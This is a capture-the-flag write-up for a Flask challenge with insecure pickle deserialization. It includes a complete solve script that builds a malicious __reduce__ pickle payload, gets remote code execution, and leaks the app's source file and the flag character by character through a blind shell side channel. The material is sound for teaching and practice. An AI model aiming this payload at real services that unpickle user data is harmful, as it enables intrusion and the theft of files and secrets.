The challenge had an endpoint that processed user supplied serialized data.

This allowed RCE (that was my first thought when I saw insecure deserialization with pickle; the actual solution is much simpler).

After achieving RCE by abusing the ``__reduce__`` method, the command output wasn’t returned directly, but I noticed the response message differed on success versus failure. This gave me the idea of performing a blind RCE side‑channel to leak the flag one character at a time.

here is the one liner i was using (it was used with ``subprocess.run`` )

```sh
tr -d "\n" < /app/app.py | head -c {len(leak)+1} | grep -q "^{leak+c}" && echo Matched || asdf
```

If it matches, it echoes Matched, triggering the success response; if it doesn’t match, it tries to execute asdf and returns an error response.
Since i didnt find the flag in /flag.txt (not /flag), I decided to leak the application’s source code and there were i found the flag.

Flag: shellmates{TiM3_tR4vEL_D3$3RIal1ZaT10N_Hack}

solve script:

```py
#!/usr/bin/env python3
import pickle
import base64
import subprocess
import requests
import time

import string


leak = "from flask import Flask, request, render_template, jsonify, sessionimport pickleimport base64import osimport hashlibimport timefrom datetime import datetimeapp = Flask(__name__)app.secret_key = os.urandom(24)# Store time capsules in memory (in production would use database)time_capsules = {}# Admin vault containing the flagADMIN_VAULT = {    'title': 'Company Secret Vault',    'message': 'shellmates{TiM3_tR4vEL_D3$3RIal1ZaT10N_Hack}"

while True: 
    found = False
    for c in "()$@!$}!#':_= {"+string.ascii_letters+string.digits+'}.':
        print(f"Trying character: {c} (current leak: {leak})")

        CMD_ARGS = ["sh", "-c", f'tr -d "\\n" < /app/app.py | head -c {len(leak)+1} | grep -q "^{leak+c}" && echo Matched || asdf']
        # CMD_ARGS = ["sh", "-c", f'tr -d "\\n" < /app/app.py | head -c {228+len(leak)+1} | tail -c {len(leak)+1}  | grep -q "^{leak+c}" && echo Matched || asdf']

        TARGET_URL  = "https://timecapsule.hackini25.shellmates.club/retrieve"


        class TimeCapsule:
            def __reduce__(self):

                return (subprocess.check_output, (CMD_ARGS,))

        def generate_payload():
            capsule = TimeCapsule()
            pickled = pickle.dumps(capsule)
            return base64.b64encode(pickled).decode()

        b64_payload = generate_payload()

        headers = {"Content-Type": "application/json"}
        start = time.time()
        try:
            res = requests.post(
                TARGET_URL,
                json={"capsule_data": b64_payload},
                headers=headers,
                timeout=10
            )
            if "true" in res.text:
                found = True
                leak += c
                print(f"Found character: {c} (current leak: {leak})")
                break
            else:
                print(res.text)
        except Exception as e:
            print(f"\nRequest failed: {e}")
    if not found:
        print("exiting")
        exit(0)

```